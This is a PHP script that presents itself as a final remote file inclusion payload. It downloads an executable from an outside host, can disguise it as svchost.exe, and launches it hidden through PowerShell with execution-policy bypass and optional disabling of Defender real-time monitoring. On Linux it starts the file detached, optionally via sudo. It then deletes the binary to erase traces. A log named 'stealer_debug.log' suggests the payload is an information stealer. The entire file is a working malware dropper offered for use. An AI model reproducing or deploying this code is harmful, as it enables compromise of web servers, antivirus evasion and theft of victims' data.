<?php
// ============================================================
// RFI payload (final): download + Defender-bypass launch + diag
//
//   $TEST       = true  → check environment only, clean up, no launch
//   $TEST       = false → real launch
//   $MASK_NAME  = ''    → keep sertyu.exe
//   $MASK_NAME  = 'svchost.exe' → disguise the binary
//   $TARGET_USER= ''    → Linux: run as current user (www-data)
//   $TARGET_USER= 'user'→ Linux: run via sudo -u user
//   $KILL_DEF   = false → Windows: toggle Real-time off/on around launch
//
// Artifacts left behind (delete after success):
//   diag.json, stealer_debug.log  (in __DIR__)
// ============================================================

$TEST        = false;
$MASK_NAME   = '';          // e.g. 'svchost.exe'
$TARGET_USER = '';
$KILL_DEF    = false;

$url   = 'https://cdn.githubraw.com/Shinedremuse/byibnflf/dab43e02e3359a5fc32133b4bd0ad4be35aa62cb/aabvv.exe';
$name  = $MASK_NAME !== '' ? $MASK_NAME : 'aabvv.exe';
$isWin = PHP_OS_FAMILY === 'Windows';

// --- Where to put the binary (Defender scans web-root hardest) ---
if ($isWin) {
    $dir  = getenv('TEMP') ?: 'C:\\Windows\\Temp';
    $file = $dir . '\\' . $name;
} else {
    $dir  = sys_get_temp_dir();
    $file = $dir . DIRECTORY_SEPARATOR . $name;
}
$log = __DIR__ . '/stealer_debug.log';

$diag = [
    'time'   => date('c'),
    'php'    => PHP_VERSION,
    'os'     => PHP_OS_FAMILY,
    'whoami' => trim((string)exec('whoami 2>/dev/null')),
    'home'   => getenv('HOME') ?: getenv('USERPROFILE') ?: '',
    'url'    => $url,
    'file'   => $file,
    'test'   => $TEST,
];

// ---------- 1. Download with HTTP-code check ----------
$context = stream_context_create([
    'http' => [
        'timeout'       => 60,
        'method'        => 'GET',
        'ignore_errors' => true,
        'header'        => "User-Agent: Mozilla/5.0\r\n",
    ],
]);
$data = @file_get_contents($url, false, $context);

$code = 0;
if (isset($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
    $code = (int)$m[1];
}

$diag['http_code'] = $code;
$diag['size']      = $data === false ? 0 : strlen($data);

if ($data === false || $code !== 200 || strlen($data) < 1024) {
    $diag['result'] = 'download_failed';
    goto finish;
}

// ---------- 2. Atomic write (tmp + rename) ----------
$tmp = $file . '.tmp';
if (file_put_contents($tmp, $data, LOCK_EX) === false) {
    $diag['result'] = 'write_failed';
    goto finish;
}
if (!rename($tmp, $file)) {
    @unlink($tmp);
    $diag['result'] = 'rename_failed';
    goto finish;
}

$diag['md5']      = md5_file($file);
$diag['filetype'] = trim((string)exec('file -b ' . escapeshellarg($file) . ' 2>/dev/null'));

// ---------- 3. Build launch command ----------
$disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));

if ($isWin) {
    // Hidden PowerShell launch (bypasses SmartScreen / console window)
    $cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "'
         . 'Start-Process -FilePath ' . escapeshellarg($file)
         . ' -WindowStyle Hidden"';

    if ($KILL_DEF) {
        // Toggle Real-time off, launch, turn back on
        $cmd = 'powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring \$true" && '
             . $cmd . ' && '
             . 'powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring \$false"';
    }
} else {
    @exec('chmod +x ' . escapeshellarg($file));
    $runner = $TARGET_USER !== ''
        ? 'sudo -u ' . escapeshellarg($TARGET_USER) . ' '
        : '';
    $cmd = $runner . 'setsid nohup ' . escapeshellarg($file)
         . ' </dev/null >' . escapeshellarg($log) . ' 2>&1 &';
}
$diag['cmd'] = $cmd;

// ---------- 4. Launch with function fallback ----------
$ran = false;
foreach (['exec', 'shell_exec', 'passthru', 'system'] as $fn) {
    if (function_exists($fn) && !in_array($fn, $disabled, true)) {
        @$fn($cmd);
        $diag['exec_fn'] = $fn;
        $ran = true;
        break;
    }
}
$diag['result'] = $ran ? 'launched' : 'no_exec_function';

// ---------- 5. Alive check + cleanup ----------
if ($ran && !$TEST) {
    sleep(3);
    $diag['alive'] = $isWin
        ? (bool)exec('tasklist /FI "IMAGENAME eq ' . $name . '" 2>nul | find /I "' . $name . '"')
        : (bool)exec('pgrep -f ' . escapeshellarg($name));

    // Cleanup: binary is already in memory, wipe disk traces
    @exec('del /f /q "' . $file . '" 2>nul', $isWin);
    @exec('rm -f ' . escapeshellarg($file), !$isWin);
    $diag['cleaned'] = true;
}

if ($TEST) {
    @unlink($file);
    $diag['result'] .= '_test_mode_cleaned';
}

finish:
// ---------- 6. Save diagnostics ----------
@file_put_contents(
    __DIR__ . '/diag.json',
    json_encode($diag, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES),
    LOCK_EX
);

exit(1); // guaranteed exit from include